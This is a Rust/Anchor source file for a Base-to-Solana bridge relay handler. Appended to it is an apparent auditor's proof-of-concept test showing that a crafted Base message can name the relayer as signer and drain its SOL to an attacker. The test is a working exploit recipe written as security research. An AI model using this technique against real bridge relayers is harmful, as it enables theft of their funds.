use anchor_lang::{
    prelude::*,
    solana_program::{self},
};

use crate::base_to_solana::{
    constants::BRIDGE_CPI_AUTHORITY_SEED, state::IncomingMessage, Message, Transfer,
};
use crate::common::{bridge::Bridge, BRIDGE_SEED};
use crate::BridgeError;

/// Accounts struct for the relay message instruction that executes cross-chain messages from Base to Solana.
/// This instruction processes incoming messages that contain either pure instruction calls or token transfers
/// with additional instructions. The message execution is performed through CPI calls using a bridge authority.
#[derive(Accounts)]
pub struct RelayMessage<'info> {
    /// The incoming message account containing the cross-chain message to be executed.
    /// - Contains either a pure call message or a transfer message with additional instructions
    /// - Must be mutable to mark the message as executed after processing
    /// - Prevents replay attacks by tracking execution status
    #[account(mut)]
    pub message: Account<'info, IncomingMessage>,

    /// The main bridge state account used to check pause status
    /// - Uses PDA with BRIDGE_SEED for deterministic address
    #[account(seeds = [BRIDGE_SEED], bump)]
    pub bridge: Account<'info, Bridge>,
}

pub fn relay_message_handler<'a, 'info>(
    ctx: Context<'a, '_, 'info, 'info, RelayMessage<'info>>,
) -> Result<()> {
    // Check if bridge is paused
    require!(!ctx.accounts.bridge.paused, BridgeError::BridgePaused);

    require!(!ctx.accounts.message.executed, BridgeError::AlreadyExecuted);

    let message = ctx.accounts.message.message.clone();
    let (transfer, ixs) = match message {
        Message::Call(ixs) => (None, ixs),
        Message::Transfer { transfer, ixs } => (Some(transfer), ixs),
    };

    // Process the transfer if it exists
    if let Some(transfer) = transfer {
        match transfer {
            Transfer::Sol(transfer) => transfer.finalize(ctx.remaining_accounts)?,
            Transfer::Spl(transfer) => transfer.finalize(ctx.remaining_accounts)?,
            Transfer::WrappedToken(transfer) => transfer.finalize(ctx.remaining_accounts)?,
        };
    }

    ctx.accounts.message.executed = true;

    // Derive the bridge CPI authority PDA tied to the message sender; used to sign all downstream CPIs.
    let (_, bump) = Pubkey::find_program_address(
        &[
            BRIDGE_CPI_AUTHORITY_SEED,
            ctx.accounts.message.sender.as_ref(),
        ],
        ctx.program_id,
    );

    let bridge_cpi_authority_seeds: &[&[u8]] = &[
        BRIDGE_CPI_AUTHORITY_SEED,
        ctx.accounts.message.sender.as_ref(),
        &[bump],
    ];

    // Execute the provided downstream instructions via signed CPI
    for ix in ixs {
        // NOTE: We always do a signed CPI even if the actual program CPIed into might not require the bridge authority signer.
        solana_program::program::invoke_signed(
            &ix.into(),
            ctx.remaining_accounts,
            &[bridge_cpi_authority_seeds],
        )?;
    }

    Ok(())
}


// Append to: bridge/solana/programs/bridge/src/base_to_solana/instructions/relay_message.rs
// Needs a built program: `anchor build` (test_utils includes target/deploy/bridge.so), then
//   cargo test -p bridge relayer_signer_privilege -- --nocapture
// UNTESTED here (no Rust toolchain in my sandbox): adjust imports if a path is private.
//
// Lead: relay_message CPIs every Base-supplied Ix with `is_signer` forwarded verbatim. Any account that signs the
// *relay transaction* (the relayer / fee payer) can therefore be named as a signer by the Base message author.

#[cfg(test)]
mod relayer_signer_privilege {
    use super::*;

    use anchor_lang::{
        solana_program::{
            instruction::{AccountMeta, Instruction},
            native_token::LAMPORTS_PER_SOL,
            system_instruction, system_program,
        },
        AccountSerialize, InstructionData, ToAccountMetas,
    };
    use solana_account::Account as SvmAccount;
    use solana_keypair::Keypair;
    use solana_message::Message as TxMessage;
    use solana_signer::Signer;
    use solana_transaction::Transaction;

    use crate::{
        accounts,
        base_to_solana::{
            internal::ix::{Ix, IxAccount},
            state::IncomingMessage,
            Message,
        },
        instruction::RelayMessage as RelayMessageIx,
        test_utils::{setup_bridge, SetupBridgeResult},
        ID,
    };

    #[test]
    fn relayer_signer_privilege_is_forwarded_to_base_originated_ix() {
        let SetupBridgeResult { mut svm, payer: relayer, bridge_pda, .. } = setup_bridge();
        let attacker = Keypair::new(); // only receives funds, never signs
        let steal: u64 = 50 * LAMPORTS_PER_SOL;

        // What a Base user can encode in a bridgeCall: a System transfer FROM the (public) relayer address,
        // with that address flagged is_signer = true.
        let t = system_instruction::transfer(&relayer.pubkey(), &attacker.pubkey(), steal);
        let ix = Ix {
            program_id: t.program_id,
            accounts: t
                .accounts
                .iter()
                .map(|m| IxAccount { pubkey: m.pubkey, is_writable: m.is_writable, is_signer: m.is_signer })
                .collect(),
            data: t.data.clone(),
        };

        // Stand-in for a message that was proven via prove_message (any Base sender address works).
        let msg = IncomingMessage { sender: [0x11u8; 20], message: Message::Call(vec![ix]), executed: false };
        let mut data = Vec::new();
        msg.try_serialize(&mut data).unwrap();
        let message_pda = Pubkey::new_unique();
        svm.set_account(
            message_pda,
            SvmAccount {
                lamports: svm.minimum_balance_for_rent_exemption(data.len()),
                data,
                owner: ID,
                executable: false,
                rent_epoch: 0,
            },
        )
        .unwrap();

        // A relayer building the tx the way scripts/.../relay-message.handler.ts does: signer roles copied from the Ix.
        let mut metas = accounts::RelayMessage { message: message_pda, bridge: bridge_pda }.to_account_metas(None);
        metas.push(AccountMeta::new(relayer.pubkey(), true));
        metas.push(AccountMeta::new(attacker.pubkey(), false));
        metas.push(AccountMeta::new_readonly(system_program::ID, false));
        let relay_ix = Instruction { program_id: ID, accounts: metas, data: RelayMessageIx {}.data() };

        let before = svm.get_balance(&relayer.pubkey()).unwrap();
        let tx = Transaction::new(
            &[&relayer],
            TxMessage::new(&[relay_ix], Some(&relayer.pubkey())),
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        assert_eq!(svm.get_balance(&attacker.pubkey()).unwrap(), steal, "attacker received the relayer's SOL");
        assert!(svm.get_balance(&relayer.pubkey()).unwrap() <= before - steal);
    }
}
